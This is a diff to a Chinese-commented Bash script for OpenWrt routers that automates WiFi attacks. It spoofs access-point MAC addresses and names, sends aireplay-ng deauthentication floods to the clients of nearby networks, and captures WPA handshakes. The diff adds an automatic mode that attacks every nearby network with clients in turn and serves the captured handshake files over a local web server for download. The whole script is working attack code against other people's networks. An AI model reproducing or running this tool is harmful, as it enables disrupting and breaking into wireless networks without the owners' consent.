@@ -8,24 +8,18 @@ ac_num=20
 red='\e[91m' green='\e[92m' yellow='\e[1;33m' magenta='\e[95m' cyan='\e[96m' none='\e[0m'
 sys_release=$(awk -F. '/DISTRIB_RELEASE/{print $1}' /etc/openwrt_release | cut -d "'" -f 2)    #获取openwrt系统版本
 #定义停留警告界面
-Error() {
-	read -sp "$(echo -e "\n${red}$*${none}\n")"
-}
+Error() { read -sp "$(echo -e "\n${red}$*${none}\n")"; }
 
 #定义停留通知界面
-Notifi() {
-	read -sp "$(echo -e "\n${green}$*${none}\n")"
-}
+Notifi() { read -sp "$(echo -e "\n${green}$*${none}\n")"; }
 
 #输出执行成功信息
-PrintTrueInfo() {
-	echo -e "\n${yellow}$*${none}\n"
-}
+PrintTrueInfo() { echo -e "\n${yellow}$*${none}\n"; }
 
 #输出执行错误信息
-PrintFalseInfo() {
-	echo -e "\n${red}$*${none}\n"
-}
+PrintFalseInfo() { echo -e "\n${red}$*${none}\n"; }
+
+ram_info=	#定义一个存放内存情况的变量
 
 #生成MAC地址文本的函数
 MacAddress() {
@@ -78,51 +72,34 @@ MacAddress() {
 GetMacName() { 																																																														  
 	[ ! -e /etc/config/scp/ap_mac.txt ] && PrintFalseInfo "没有找到存放ap mac地址的文档，请重新设置安全设置脚本!" && exit #没有找到存放ap的mac地址的文档提示并退出
 	get_mac_num=$(cat /etc/config/scp/ap_mac.txt | wc -l)	#获取mac地址的总数量
-	[ "${get_mac_num}" == "0" ] && PrintFalseInfo "存放mac地址的文档是空的，这样无法创建热点，正在退出脚本" && exit	#判断mac地址的数量为0的时候提示并退出脚本
-	get_random_wei=$(echo ${get_mac_num} | wc -L)   #获取ap的mac地址数量的位数
-	if [ "${get_random_wei}" != "1" ];then  #检测位数不是1位的
-		num=1
-		while :;do
-			random_num=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c1)  #获取随机数值
-			if [[ "${random_num}" != "0" && "${random_num}" -le "${get_random_wei}" ]];then   #判断获取到的实际数值是否超过了ap的mac地址的位数没有则进行赋值。
-				random_max="${random_num}"; break
-			fi
-			[ "${num}" == "100" ] && exit   #循环100次，则退出程序
-			let num+=1  #计数
-		done
-	else    #位数为1位的就赋值为1
-		random_max=1
-	fi
-	num=1	#计数
+	num=0	#计数
 	while :;do
-		getRandomNum=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "0123456789"  2>/dev/null | head -c${random_max})	#获取随机数值，用来到ap文档中提取mac地址
-		if [[ "${getRandomNum}" != "0" && "${getRandomNum}" -le "${get_mac_num}" ]];then								#检查获取到的随机数值是否超过了ap总行数，没有则往下进行
-			get_name_mac="$(sed -n "${getRandomNum}p" /etc/config/scp/ap_mac.txt | sed -n "1p" )"	#从文档中获取mac地址和名称
-			host_name=$(echo "${get_name_mac}" | cut -d '^' -f 1 | sed -n "1p")						#提取名称
-			if [ "${host_name}" == "CMCC" ];then
-				while :;do
-					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c4)	#随机生成最后一段名称
-					host_name="${host_name}-${get_last_name}"				#汇总名字
-					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
-				done
-			elif [ "${host_name}" == "@PHICOMM" ];then
-				while :;do
-					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c2)	#随机生成最后一段名称
-					host_name="${host_name}_${get_last_name}"				#汇总名字
-					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
-				done
-			else
-				while :;do
-					get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "A-F0-9"  2>/dev/null | head -c4)		#随机生成最后一段名称
-					host_name="${host_name}_${get_last_name}"				#汇总名字
-					[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
-				done			   
-			fi																																																	
-			wlan_mac="$(echo "${get_name_mac}" | cut -d '^' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom  | sed -n "1p")"	#根据AP品牌mac地址前三段，再随机生成后三段，获取mac地址
-			[[ ! -z "${host_name}" && ! -z "${wlan_mac}" && "$(echo "${wlan_mac}" | wc -L)" == "17" ]] && break	#检查mac地址没有问题，主机名不是空的就跳出循环。
-		fi
 		[ "${num}" == "100" ] && exit	#有一百次的机会，到了一百次就退出脚本。
 		let num=num+1	#计数器
+		get_name_mac="$(sed -n "$(awk -v lineNum="$get_mac_num" 'BEGIN{srand();print int(rand() * 1000000 % lineNum +1)}')p" /etc/config/scp/ap_mac.txt)"
+		[ -z "${get_name_mac}" ] && continue
+		host_name=$(echo "${get_name_mac}" | cut -d '^' -f 1 | sed -n "1p")						#提取名称
+		if [ "${host_name}" == "CMCC" ];then
+			while :;do
+				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c4)	#随机生成最后一段名称
+				host_name="${host_name}-${get_last_name}"				#汇总名字
+				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
+			done
+		elif [ "${host_name}" == "@PHICOMM" ];then
+			while :;do
+				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "a-zA-Z0-9"  2>/dev/null | head -c2)	#随机生成最后一段名称
+				host_name="${host_name}_${get_last_name}"				#汇总名字
+				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
+			done
+		else
+			while :;do
+				get_last_name=$(head -n 5 /dev/urandom 2>/dev/null | tr -dc "A-F0-9"  2>/dev/null | head -c4)		#随机生成最后一段名称
+				host_name="${host_name}_${get_last_name}"				#汇总名字
+				[ ! -z "${host_name}" ] && break						#名字不为空则退出循环
+			done			   
+		fi																																																	
+		wlan_mac="$(echo "${get_name_mac}" | cut -d '^' -f 2)$(hexdump -n 3 -e '/1 ":%02x"' /dev/urandom  | sed -n "1p")"	#根据AP品牌mac地址前三段，再随机生成后三段，获取mac地址
+		[[ ! -z "${host_name}" && ! -z "${wlan_mac}" && "$(echo "${wlan_mac}" | wc -L)" == "17" ]] && break	#检查mac地址没有问题，主机名不是空的就跳出循环。
 	done
 }
 
@@ -258,25 +235,54 @@ DeleteMonitor() {
 Menu() {
 	while :;do
 		[ ! -e /tmp/zb.txt ] && PrintFalseInfo "没有找到zb.txt文档" && return 1 #判断信息
-		clear
+		CleanKill; clear	#结束抓包相关程序+清屏
 		echo -e "${yellow}No.\tPower\tBSSID\t\tChannel\tBeacons\tDate\tESSID\t\tStation${none}" #输出标题
 		cat /tmp/zb.txt | sed 's/\^\&//g'; echo ""  #显示WiFi信息
-		echo -en "\033[?25h${magenta}请选择要抓包WiFi的序列号【1-${wifi_num}】，重新扫描【s】，退出【q】\n请按提示输入：${none}"; read select_num   #等待用户输入
+		echo -en "\033[?25h${magenta}请选择要抓包WiFi的序列号【1-${wifi_num}】，重新扫描【s】，退出【q】，列出抓到的握手包【t】\n自动抓包【a】，请按提示输入：${none}"; read select_num   #等待用户输入
 		[ -z "${select_num}" ] && Error "输入为空，回车后重新输入" && continue  #输入为空提示用户重新输入
 		if [ "${select_num}" == "s" ];then  #s为重新扫描周围的WiFi信息
 			Get_Wifi_Info; continue #获取周围WiFi信息并重新执行循环
+		elif [ ${select_num} == t ];then	#列出抓到的握手包
+			Get_Cap; continue
+		elif [ ${select_num} == a ];then	#自动抓包
+			[ -f /tmp/RamInfo ] && rm /tmp/RamInfo
+			Auto_Capture_Package; continue
 		elif [ "${select_num}" == "q" ];then    #q退出程序，并开始删除热点、开启网卡无线功能、终止程序
 			DeleteMonitor; EnabledWifi; CleanKill; exit 
+		elif [ -n "$(echo ${select_num} | egrep '[a-zA-Z]')" ];then    #q退出程序，并开始删除热点、开启网卡无线功能、终止程序
+			Error "输入的内容没有定义功能，请按照提示输入"; continue
 		elif [[ "${select_num}" -gt "${wifi_num}" || "${select_num}" -lt "0" ]];then
 			Error "输入的数值超出范围，请按照提示的范围输入序列号"; continue
 		fi
-		Bsid="$(sed -n "${select_num}p" /tmp/zb.txt | awk '{print $3}')"  #获取选择的WiFi的mac地址
-		Chanel="$(sed -n "${select_num}p" /tmp/zb.txt | awk '{print $4}')"  #获取选择的WiFi的信道
-		Esid="$(sed -n ${select_num}p /tmp/zb.txt | awk '{print $7}')"      #获取选择的WiFi的名称
-		Station="$(sed -n ${select_num}p /tmp/zb.txt| awk '{print $8}')"    #获取选择的WiFi的客户端
-		[ -z ${Bsid} ] && Error "没有提取到WiFi的mac地址，重新选择一下吧" && continue  #获取的WiFimac地址为空重新选择
-		PrintTrueInfo "已选择【${Esid}】"; sleep 1; break       #输出选择的WiFi名称，并退出循环
+		package_name="zb.txt";Get_Info ${select_num}; [ $? != 0 ] && continue || break	#获取WiFi信息
 	done	
+}
+
+#获取WiFi信息
+Get_Info() {
+	Bsid="$(sed -n "$*p" /tmp/${package_name} | awk '{print $3}')"  #获取选择的WiFi的mac地址
+	Chanel="$(sed -n "$*p" /tmp/${package_name} | awk '{print $4}')"  #获取选择的WiFi的信道
+	Esid="$(sed -n $*p /tmp/${package_name} | awk '{print $7}')"      #获取选择的WiFi的名称
+	Station="$(sed -n $*p /tmp/${package_name} | awk '{print $8}')"    #获取选择的WiFi的客户端
+	[ -z ${Bsid} ] && Error "没有提取到WiFi的mac地址，重新选择一下吧" && return 1  #获取的WiFimac地址为空重新选择
+	PrintTrueInfo "已选择【${Esid}】"; sleep 1; return 0       #输出选择的WiFi名称，并退出循环
+}
+
+#自动抓包
+Auto_Capture_Package() {
+	[ ! -f /tmp/zb.txt ] && Error "没有找到存放抓包文档"  && return 1
+	awk '{ if($8 != ""){print $0}}' /tmp/zb.txt | sort -nur >/tmp/auto_zb.txt	#获取带有客户端的WiFi
+	[[ ! -f /tmp/auto_zb.txt || -z "$(cat /tmp/auto_zb.txt)" ]] && Error "没有获取到带有客户端的WiFi" && return 1	#检查获取到的自动抓包文档是否存在和是否为空，为空不存在就提示病返回。
+	let wifi_line_num="$(cat /tmp/auto_zb.txt | wc -l)"	#获取WiFi的行数
+	[ -f /tmp/handshake_packt.txt ] && rm -f /tmp/handshake_packt.txt
+	line_num=0
+	while [ "${line_num}" -lt "${wifi_line_num}" ];do
+		let line_num+=1
+		clear; package_name="auto_zb.txt";Get_Info ${line_num}; [ $? != 0 ] && continue	#获取WiFi信息
+		[ -f /tmp/cap/"${Esid}".cap ] && PrintTrueInfo "${Esid} 已经抓到握手包" && sleep 2 && continue
+		AccuseWifi;[ $? == 2 ] && break #网络攻击，攻击完后清理屏幕，检测返回值2则退出循环抓包
+	done
+	[ -f /tmp/handshake_packt.txt ] && { CleanKill; clear; echo -e "${yellow}以下是抓到的握手包，点击链接就可以导出来\n\n${green}$(cat /tmp/handshake_packt.txt)${none}";echo ;read -sp "导完回车返回菜单"; }
 }
 
 #检测监听热点删除监听热点
@@ -284,8 +290,7 @@ CheckMonitor() {
 	while :;do
 		monitor_name="$(uci show | grep 'monitor' | cut -d '.' -f 1,2)" #获取监听热点
 		[ -z "${monitor_name}" ] && PrintTrueInfo "监听热点清理完成" && return 0	#获取监控热点的变量为空则清理完成，退出循环
-		for i in ${monitor_name}	   #有监控热点循环删除监控热点	 
-		do
+		for i in ${monitor_name};do	   #有监控热点循环删除监控热点	 
 			uci delete $i	   #删除监控热点
 		done
 		uci commit wireless; wifi reload > /dev/null	#监控热点删除后，应用无线配置和WiFi重新加载。
@@ -301,7 +306,7 @@ CheckHandshake() {
 			{ aircrack-ng /tmp/cap/tmp_1-01.cap > /tmp/packe_if.log; } &	#后台执行检测握手包信息
 			AIR_PID=$! ; sleep 4   #并获取执行的id
 			[ ! -z ${AIR_PID} ] && kill -9 ${AIR_PID} &>/dev/null   #终止检测命令
-			[ "$(cat /tmp/packe_if.log | grep -a 'Killedg packets')" != "" ] && let num_while+=1    #检测到‘Killedg packets’计数一次
+			[[ -f /tmp/packe_if.log && "$(grep -a 'Killedg packets' /tmp/packe_if.log 2>/dev/null)" != "" ]] && let num_while+=1    #检测到‘Killedg packets’计数一次
 			if [ "${num_while}" == "20" ];then  #检测到‘Killedg packets’20次的时候，删除相关配置，还有终止检测的命令，再重新开始检测
 				killall -2 airodump-ng &>/dev/null; rm -rf /tmp/cap/tmp_1-01*
 		        GrabPack&		#开始执行抓包，放到后台执行
@@ -334,6 +339,9 @@ CleanMem() {
 	echo 1 > /proc/sys/vm/drop_caches; echo 2 > /proc/sys/vm/drop_caches; echo 3 > /proc/sys/vm/drop_caches
 }
 
+#退出抓包并显示退出信息
+Exit_Info() { CleanKill; CleanMem;rm /tmp/Noclient &>/dev/null;clear; PrintTrueInfo "$*正在退出抓包. . ."; }
+
 #攻击wifi网络
 AccuseWifi() {
 	[ ! -e /tmp/cap ] && mkdir -p /tmp/cap  #不存在存放握手包的cap目录，则创建
@@ -342,28 +350,52 @@ AccuseWifi() {
 	echo 1 /proc/sys/vm/drop_caches &>/dev/null; PrintTrueInfo "可按任意键退出抓包程序"    #清理内存+显示信息
 	sleep 2; GrabPack&  #抓包，放到后台执行。
 	air_pid=$!  #后去执行抓包程序的id号
-	if [[ "$(echo "${Esid}" | sed 's/[-,0-9,a-z,A-Z,_,@]//g')" != "" ]];then    #判断WiFi名称中是否有高位字符的
+	if [[ "$(echo "${Esid}" | sed 's/[-,0-9,a-z,A-Z,_,@]//g')" != "" || -n "$(echo ${Esid} | egrep '\<uknow\>')" ]];then    #判断WiFi名称中是否有高位字符的
 		Esid="$(echo ${Bsid} | sed 's/:/-/g')"  #处理一下WiFi的mac地址作为WiFi名称显示出来
 	fi
 	Crack&	#攻击客户端，放到后台执行
 	CPID=$! #记录执行的id号
 	CheckHandshake&	#检查是否抓到握手包，放到后台执行
 	CHSK=$!   #记录执行的id号
-	num_ll=0
+	count_a=0 
+	count_b=0
+	start_time=1	#统计时间
 	while :;do
-		if [[ -f /tmp/packe_if.log && "$(cat /tmp/packe_if.log 2>/dev/null | grep -a "1 handshake")" != "" ]];then  #抓包握手包
+		if [[ -f /tmp/packe_if.log && -n "$(grep -a "1 handshake" /tmp/packe_if.log 2>/dev/null)" ]];then  #抓包握手包
 			[ -e /tmp/cap/tmp_1-01.cap ] && mv /tmp/cap/tmp_1-01.cap /tmp/cap/"${Esid}".cap #把临时生成的握手包文件，重命令为WiFi名称
 			CleanKill;clear #清理程序和清屏
-			echo -e "\n\n${yellow}* * *已经抓到${Esid}握手包* * *${none}\n" && test -e /tmp/running.txt && rm /tmp/running.txt
-			echo -e "\n${yellow}抓到的握手包在这个网址中，请单击下面的网址导出握手包\n\nhttp://${ip_address}:8080${none}/cap/${Esid}.cap\n"
-			echo "";read -sp "$(echo -e "${green}回车后继续抓包${none}")"
+			if [ ${select_num} != a ];then
+				echo -e "\n\n${yellow}* * *已经抓到${Esid}握手包* * *${none}\n" && test -e /tmp/running.txt && rm /tmp/running.txt
+				echo -e "\n${yellow}抓到的握手包在这个网址中，请单击下面的网址导出握手包\n\nhttp://${ip_address}:8080${none}/cap/${Esid}.cap\n"
+				echo "";read -sp "$(echo -e "${green}回车后继续抓包${none}")"
+			else
+				echo -e "\n\n${yellow}* * *已经抓到${Esid}握手包* * *${none}\n";sleep 2;echo "http://${ip_address}:8080/cap/${Esid}.cap\n">>/tmp/handshake_packt.txt
+			fi
 			CleanMem;break  #清理内存，并退出循环
+		fi
+		[[ ${select_num} == a && -f /tmp/packe_if.log ]] && packt_num="$(awk '/Read /{print $2}' /tmp/packe_if.log 2>/dev/null | sed -n 1p)"	#获取抓包数量
+		[ -n "$(grep 'No networks found' /tmp/packe_if.log 2>/dev/null)" ] && { let count_a+=1; }							#判断没有客户端了记录一次
+		if [[ ${count_a} == 12 ]];then
+			Exit_Info "没有检测到WiFi网络，稍后重新扫描网络看看，";sleep 1; [[ ${select_num} != a ]] && Notifi "回车后返回菜单"
+			return
 		fi
 		read -t 1 -n 1 selct_q  #停留一秒钟，等待输入任意键退出
 		if [ "$?" == "0" ];then #检测到用户输入任意键，开始停止抓包
 			[ "${selct_q}" == "d" ] && rm -rf /tmp/cap/*    #检测输入的是d，则清理抓包的握手包
-			PrintTrueInfo "正在退出抓包. . ."
-			CleanKill; CleanMem; break  #清理程序和内存
+			PrintTrueInfo "正在退出抓包. . ."; CleanKill; CleanMem  #清理程序和内存
+			[ "${selct_q}" == "q" ] && return 2 || return 1
+		fi
+		if [[ ${select_num} == a && -f /tmp/packe_if.log ]];then
+			[ "$(awk '/Read /{print $2}' /tmp/packe_if.log 2>/dev/null | sed -n 1p)" == "${packt_num}" ] && { let count_b+=1; } || count_b=0	#判断包数量是否一样，一样记录一次
+			let start_time+=1
+			if [[ "$(cat /tmp/RamInfo 2>/dev/null)" == 1 ]];then
+				read -n 1 selct_q;[ "${selct_q}" == "d" ] && rm -rf /tmp/cap/*
+				[ -f /tmp/RamInfo ] && rm /tmp/RamInfo
+				break
+			fi
+			[[ ${start_time} == 180 ]] && { Exit_Info; break; }	#自动抓包的限定时间，限定时间为3分钟 
+			[[ ${count_b} == 40 ]] && { Exit_Info "这个WiFi抓包没有希望了，"; sleep 1;break; }
+			[[ "$(cat /tmp/Noclient 2>/dev/null)" == 1 ]] && { Exit_Info "没有检测到客户端，";sleep 1; break; }
 		fi
 	done
 }
@@ -373,20 +405,19 @@ Crack(){
 	client_mac= 	#定义存放客户端的变量
 	count=0 #计数变量
 	while :;do
-        [ $count -ge 4 ] && break   #循环超过4次退出循环。
+		[[ $count == 35 && "${select_num}" == a ]] && echo 1 > /tmp/Noclient	#计数到30也没有发现客户端，在自动抓包模式中，则建立一个文档用来通知，以便终止抓包
 		[[ -z "${Bsid}" || -z "${Esid}" || -z "${Monitor_driver}" ]] && Error "没有获取到WiFi的名称|mac地址|驱动名称，无法攻击重新选择一下WiFi" && return 1
 		if [[ -e /tmp/cap/tmp_1-01.csv ]];then  #检测存在获取WiFi信息保存的文档
+			let count+=1	#计数
 			client_mac="$(cat /tmp/cap/tmp_1-01.csv | grep ${Bsid} | grep -v CCMP | cut -d ',' -f 1)"   #获取WiFi家的客户端mac地址
-			if [[ -z "${client_mac}" ]];then    #没有获取到，使用变量中提取出来的一个客户端mac地址
-				[ ! -z "${Station}" ] && client_mac=${Station} || client_mac=
-			fi
-		else    #不存在使用变量中获取到的一个客户端信息
-			[ ! -z "${Station}" ] && client_mac=${Station} || client_mac=
+			[[ -z "${client_mac}" ]] && { sleep 1;continue; }    #没有获取到，使用变量中提取出来的一个客户端mac地址
+		else    #不存在抓包程序等待1秒钟重新检查
+			sleep 1;continue
 		fi
 		sleep 1
 		for i in ${client_mac};do   #循环处理获取到的客户单mac地址
 			if [[ -f /tmp/cap/tmp_1-01.cap ]];then  #存在抓包生成的握手包文件，则开始执行攻击
-				[[ -f /tmp/packe_if.log && "$(cat /tmp/packe_if.log | grep -a "1 handshake")" != "" ]] && sleep 2 && return 0  #检测抓到握手包退出循环
+				[[ -f /tmp/packe_if.log && -n "$(grep -a "1 handshake" /tmp/packe_if.log 2>/dev/null)" ]] && sleep 2 && return 0  #检测抓到握手包退出循环
 				aireplay-ng -0 ${ac_num} -a ${Bsid} -c ${i} ${Monitor_driver} --ignore-negative-one &>/dev/nul  #攻击WiFi家的客户端
 				killall aireplay-ng &>/dev/null; sleep 20 #攻击完，终止程序，暂停20秒	
 			else    #不存在退出循环
@@ -412,7 +443,7 @@ MonitorRam() {
 		#检测内存剩余大小
 		ram_free="$(awk '/MemFree/{print $2}' /proc/meminfo)"   #获取内存剩余的多少，单位为kb
 		let ram_free/=1024  #把内存剩余空间换算为MB
-		[ ${ram_free} -le 10 ] && { clear; CleanKill; CleanMem; PrintRamSmall; }	#当内存小于等于10MB就开始，终止抓包程序，清理内存，提示内存不足
+		[ ${ram_free} -le 10 ] && { clear; echo 1 >/tmp/RamInfo ; CleanKill; CleanMem; PrintRamSmall; }	#当内存小于等于10MB就开始，终止抓包程序，清理内存，提示内存不足
 	done
 }
 
@@ -516,12 +547,36 @@ CheckWirless() {
 	done
 }
 
+#获取抓到的握手包
+Get_Cap() {
+	if [[ -d /tmp/cap &&  -n "$(ls /tmp/cap/ 2>/dev/null)" ]];then
+		ls /tmp/cap > /tmp/Cap.txt
+		PrintTrueInfo "以下是抓到的握手包链接，点击即可下载，使用ssh终端需要复制到浏览器中访问才能进行下载"
+		while read line;do
+			echo -e "http://${ip_address}:8080/cap/${line}\n"
+		done < /tmp/Cap.txt
+		Notifi "处理完成，回车返回主菜单" && return 0
+	else
+		Notifi "没有发现有抓到的握手包" && return 1
+	fi
+}
+
 #主要程序===============================================>
 CheckSoftware   #检测抓包脚本依赖的软件是否存在
 CleanKill	   #清理抓包产生的临时文件和终止程序
 CheckMonitor	#检测监听热点删除监听热点
 CleanMem		#清理内存
 # MountNfs	 #挂在nfs盘符
+
+#判断路由器的网页服务器类型
+if [ -e /etc/nginx ];then   #判断Nginx是否存在，存在使用nginx作为到处握手包用的网页服务器程序
+	NginxConfig
+elif [ -f /etc/config/uhttpd ];then #判断Nginx不存在，uhttps存在，存在使用uhttps作为到处握手包用的网页服务器程序
+	UhttpdConfig	
+else
+	PrintFalseInfo "没有找到网页服务器" && exit
+fi
+ip_address="$(uci get network.lan.ipaddr)"	#获取ip地址
 [ ! -e /etc/config/scp/mac.txt ] && MacAddress  #检测存放AP的mac地址文档不存在，执行生成mac地址文档的函数。
 wireless_num=$(uci show | grep wireless.radio[0,1,2]=wifi | wc -l)	  #获取当前路由器的频段数量，如，单频、双频、三频
 [[ -z ${wireless_num} ]] && PrintFalseInfo "没有检测到无线频段，请检查无线是否正常" && exit #检测到无线数量为空，则提示用户并退出脚本
@@ -535,32 +590,23 @@ elif [ ! -z "$(echo ${wireless_num} | egrep '2|3')" ];then
 		PrintTrueInfo "1、抓取2.4G频段的包"
 		PrintTrueInfo "2、抓取5G频段的包"
 		[[ "${wireless_num}" == "3" ]] &&PrintTrueInfo "3、抓取另一个5G频段的包"
+		PrintTrueInfo "0、获取已抓到的握手包"
 		#<=============================
 		echo -en "\033[?25h${magenta}请选择输入序列号【按q退出】：${none}";read select_packe	#等待用户输入
-		[[ "${select_packe}" == "q" ]] && exit  #输入为q的时候退出程序
-		if [ "${select_packe}" == "1" ];then
-			AddMonitor 2; CheckWirless		  #创建监听热点和检测创建的监听热点
-		elif [ "${select_packe}" == "2" ];then
-			AddMonitor 5; CheckWirless		  #创建监听热点和检测创建的监听热点
-		elif [ "${select_packe}" == "3" ];then
-			AddMonitor 6; CheckWirless		  #创建监听热点和检测创建的监听热点
-		else
-			Error "请按照提示输入"; continue
-		fi
+		case ${select_packe} in
+			"1") AddMonitor 2; CheckWirless	;;	  #创建监听热点和检测创建的监听热点
+			"2") AddMonitor 5; CheckWirless	;;	  #创建监听热点和检测创建的监听热点
+			"3") AddMonitor 6; CheckWirless	;;	  #创建监听热点和检测创建的监听热点
+			"0") Get_Cap; continue ;;			  #获取已抓到的握手包
+			"q") exit ;; 						  #输入为q的时候退出程序
+			*) Error "请按照提示输入"; continue ;;
+		esac
 		break
 	done
 fi
-#获取ip地址
-ip_address="$(uci get network.lan.ipaddr)"
 MonitorRam&	 #监控内存，放到后台执行，发现内存不足就自动清理
-#判断路由器的网页服务器类型
-if [ -e /etc/nginx ];then   #判断Nginx是否存在，存在使用nginx作为到处握手包用的网页服务器程序
-	NginxConfig
-elif [ -f /etc/config/uhttpd ];then #判断Nginx不存在，uhttps存在，存在使用uhttps作为到处握手包用的网页服务器程序
-	UhttpdConfig	
-else
-	PrintFalseInfo "没有找到网页服务器" && exit
-fi
+ram_id=$!
+
 Get_Wifi_Info    #获取周围WiFi信息
 while :;do
 	Menu; AccuseWifi; CleanMem		#选择WiFi网络菜单，攻击无线网络，清理内存
